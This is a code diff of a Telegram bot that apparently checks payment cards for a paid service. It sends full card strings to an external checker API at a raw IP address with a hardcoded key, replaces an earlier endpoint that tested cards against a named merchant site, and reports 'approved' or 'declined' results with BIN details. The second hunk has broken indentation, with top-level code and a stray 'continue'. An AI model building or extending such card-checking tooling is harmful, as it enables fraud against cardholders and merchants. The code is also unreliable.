@@ -1036,40 +1036,59 @@ async def get_bin_details(bin_number: str) -> dict:
     return BIN_DATABASE.get(bin_number, {"brand": "Unknown", "issuer": "Unknown", "country": "Unknown"})
 
 # Background card check
-async def background_check(cc_normalized, user, user_data, processing_msg):
-    parts = cc_normalized.split("|")
-    bin_number = parts[0][:6]
-    bin_info = await get_bin_details(bin_number)
-
+async def background_check(cc_normalized, parts, user, user_data, processing_msg):
+    start_time = time.time()
     try:
-        # Run multi-check from auth.py
-        result = await multi_checking(cc_normalized)
-        response = await charge_resp(result)
+        # BIN lookup remains the same
+        bin_number = parts[0][:6]
+        bin_details = await asyncio.to_thread(get_bin_details_sync, bin_number)
+        brand = (bin_details.get("scheme") or "N/A").upper()
+        issuer = (bin_details.get("type") or "N/A").upper()
+        country_name = (bin_details.get("country_name") or "N/A").upper()
 
-        # Timestamp
-        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        # New API URL
+        api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
 
-        # Format final message
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=25) as resp:
+                if resp.status != 200:
+                    raise Exception(f"HTTP {resp.status}")
+                data = await resp.json()
+
+        # Assuming the new API returns keys: status, response
+        api_status = (data.get("status") or "Unknown").title()
+        api_response = data.get("response") or "N/A"
+        time_taken = round(time.time() - start_time, 2)
+
+        if api_status.lower() == "approved":
+            header = "❖❖❖\\[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ \\]❖❖❖"
+        elif api_status.lower() == "declined":
+            header = "❖❖❖\\[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ \\]❖❖❖"
+        else:
+            header = f"❖❖❖\\[ {escape_markdown(api_status, version=2)} \\]❖❖❖"
+
+        formatted_response = f"_{escape_markdown(api_response, version=2)}_"
+
         final_text = (
-            f"✘ Card        ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
+            f"{header}\n"
+            f"✘ Card        ➜ {escape_markdown(cc_normalized, version=2)}\n"
             "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
-            f"✘ Response    ➜ {escape_markdown(response, version=2)}\n"
+            f"✘ Response    ➜ {formatted_response}\n"
             "――――――――――――――――\n"
-            f"✘ Brand       ➜ {escape_markdown(bin_info['brand'], version=2)}\n"
-            f"✘ Issuer      ➜ {escape_markdown(bin_info['issuer'], version=2)}\n"
-            f"✘ Country     ➜ {escape_markdown(bin_info['country'], version=2)}\n"
+            f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
+            f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
+            f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
             "――――――――――――――――\n"
-            f"✘ Request By  ➜ [{escape_markdown(user.first_name, version=2)}](tg://user?id={user.id})\n"
+            f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan', 'Free'), version=2)}\\]\n"
             "✘ Developer   ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
-            f"✘ Time        ➜ {escape_markdown(time_now, version=2)}\n"
+            f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
             "――――――――――――――――"
         )
-
         await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
 
     except Exception as e:
         await processing_msg.edit_text(
-            f"❌ Error: `{escape_markdown(str(e), version=2)}`",
+            f"❌ API Error: {escape_markdown(str(e), version=2)}",
             parse_mode=ParseMode.MARKDOWN_V2
         )
 
@@ -1199,18 +1218,26 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             error_count += 1
             break
 
-        api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(api_url, timeout=25) as resp:
-                    if resp.status != 200:
-                        raise Exception(f"HTTP {resp.status}")
-                    data = await resp.json()
-        except Exception as e:
-            results.append(f"❌ API Error for card `{escape_markdown(raw, version=2)}`: {escape_markdown(str(e), version=2)}")
-            error_count += 1
-            checked_count += 1
-            continue
+# New API URL
+api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
+
+try:
+    async with aiohttp.ClientSession() as session:
+        async with session.get(api_url, timeout=25) as resp:
+            if resp.status != 200:
+                raise Exception(f"HTTP {resp.status}")
+            
+            data = await resp.json()
+
+except Exception as e:
+    results.append(
+        f"❌ API Error for card `{escape_markdown(raw, version=2)}`: "
+        f"{escape_markdown(str(e), version=2)}"
+    )
+    error_count += 1
+    checked_count += 1
+    continue
+
 
         api_status = (data.get("status") or "Unknown").title()
         api_response = data.get("response") or "N/A"
